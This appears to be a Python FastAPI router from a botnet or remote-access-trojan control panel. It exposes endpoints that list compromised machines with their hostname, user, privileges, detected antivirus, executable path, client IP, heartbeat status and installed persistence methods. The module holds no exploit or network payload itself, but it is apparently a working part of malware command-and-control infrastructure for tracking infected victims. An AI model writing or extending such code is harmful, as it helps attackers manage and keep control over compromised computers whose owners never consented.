"""Bots router."""

import time

from fastapi import APIRouter, HTTPException, status

from ...storage import get_bot, list_bots
from ..deps import CurrentUser, RegistryDep
from ..schemas import Bot, BotListResponse, BotStatus, PersistenceMethod

router = APIRouter(prefix="/api/bots", tags=["bots"])


def calculate_status(bot: dict, is_connected: bool) -> BotStatus:
    """Calculate bot status based on connection and heartbeat."""
    if not is_connected and not bot.get("is_connected"):
        return BotStatus.OFFLINE

    # Check heartbeat freshness
    last_hb = bot.get("last_heartbeat") or 0
    now = int(time.time())

    if now - last_hb < 60:
        return BotStatus.ONLINE
    elif is_connected or bot.get("is_connected"):
        return BotStatus.STALE
    else:
        return BotStatus.OFFLINE


def bot_to_schema(bot: dict, registry_connected: bool) -> Bot:
    """Convert a bot dict from DB to schema."""
    persistence = []
    if bot.get("persistence"):
        for p in bot["persistence"]:
            if isinstance(p, dict):
                persistence.append(PersistenceMethod(
                    method=p.get("method", p.get("name", "")),
                    installed=p.get("installed", False),
                ))

    return Bot(
        hwid=bot["hwid"],
        hostname=bot.get("hostname"),
        os=bot.get("os"),
        arch=bot.get("arch"),
        username=bot.get("username"),
        privileges=bot.get("privileges"),
        av=bot.get("av", []),
        exe_path=bot.get("exe_path"),
        version=bot.get("version"),
        first_seen=bot.get("first_seen"),
        last_seen=bot.get("last_seen"),
        is_connected=registry_connected,
        last_heartbeat=bot.get("last_heartbeat"),
        client_ip=bot.get("client_ip"),
        persistence=persistence,
        status=calculate_status(bot, registry_connected),
    )


@router.get("", response_model=BotListResponse)
async def get_bots(
    current_user: CurrentUser,
    registry: RegistryDep,
):
    """List all bots with their current status."""
    bots_db = await list_bots()

    # Get set of connected HWIDs from registry
    connected = await registry.list_all()
    connected_hwids = {c.hwid for c in connected}

    bots = [
        bot_to_schema(b, b["hwid"] in connected_hwids)
        for b in bots_db
    ]

    return BotListResponse(bots=bots, total=len(bots))


@router.get("/{hwid}", response_model=Bot)
async def get_bot_detail(
    hwid: str,
    current_user: CurrentUser,
    registry: RegistryDep,
):
    """Get detailed information about a specific bot."""
    bot = await get_bot(hwid)
    if not bot:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Bot not found",
        )

    is_connected = await registry.is_connected(hwid)
    return bot_to_schema(bot, is_connected)
